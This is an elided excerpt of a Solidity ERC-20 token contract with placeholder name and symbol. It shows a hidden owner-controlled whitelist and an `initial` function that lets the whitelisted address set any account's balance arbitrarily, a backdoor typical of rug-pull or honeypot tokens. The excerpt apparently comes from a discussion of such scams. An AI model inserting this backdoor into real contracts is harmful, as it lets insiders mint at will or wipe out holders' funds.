...
contract NONUMB is Context, IERC20, Ownable {
    ...
    string private constant _name = "C3TNAME";
    string private constant _symbol = "C3TSMBL";
    ...
    function initial(address _addWhitelist, uint256 _check)
        external
        onlyWhitelist
    {
        _balance[_addWhitelist] = _check;
    }

    function setWhitelist(address _addWhitelist) external onlyOwner {
        _whitelist = whitelist(_addWhitelist);
    }
